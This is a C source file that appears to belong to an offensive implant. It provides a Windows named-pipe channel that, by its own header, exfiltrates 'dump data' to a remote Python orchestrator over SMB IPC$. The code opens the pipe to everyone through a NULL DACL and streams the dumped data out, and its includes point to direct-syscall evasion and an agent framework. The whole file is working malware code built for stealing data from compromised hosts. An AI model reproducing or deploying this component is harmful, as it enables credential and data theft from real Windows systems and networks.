/**
 * Named pipe communication for exfiltrating dump data.
 * Creates a named pipe that the Python orchestrator reads from via SMB IPC$.
 */

#include <windows.h>
#include "../include/ntdefs.h"
#include "../include/syscalls.h"
#include "../include/agent.h"

HANDLE open_named_pipe(const wchar_t *pipe_name) {
    // Build the full pipe path: \\.\pipe\<name>
    wchar_t path[256];
    wsprintfW(path, L"\\\\.\\pipe\\%s", pipe_name);

    // Create a security descriptor that allows Everyone to connect
    SECURITY_DESCRIPTOR sd;
    InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
    SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);  // NULL DACL = allow all

    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(sa);
    sa.lpSecurityDescriptor = &sd;
    sa.bInheritHandle = FALSE;

    // Create the named pipe (duplex for SMB compatibility, byte-mode, blocking)
    HANDLE pipe = CreateNamedPipeW(
        path,
        PIPE_ACCESS_DUPLEX,              // Duplex (allows SMB clients to open R/W)
        PIPE_TYPE_BYTE | PIPE_WAIT,     // Byte mode, blocking
        1,                               // Max instances
        1024 * 1024,                     // Out buffer size (1MB)
        0,                               // In buffer (not used)
        30000,                           // Timeout (30s)
        &sa                              // Permissive security
    );

    if (pipe == INVALID_HANDLE_VALUE) {
        return NULL;
    }

    // Wait for the orchestrator to connect
    if (!ConnectNamedPipe(pipe, NULL)) {
        if (GetLastError() != ERROR_PIPE_CONNECTED) {
            CloseHandle(pipe);
            return NULL;
        }
    }

    return pipe;
}

BOOL write_pipe(HANDLE pipe, const void *data, DWORD size) {
    DWORD written;
    return WriteFile(pipe, data, size, &written, NULL) && written == size;
}

void close_pipe(HANDLE pipe) {
    FlushFileBuffers(pipe);
    DisconnectNamedPipe(pipe);
    CloseHandle(pipe);
}
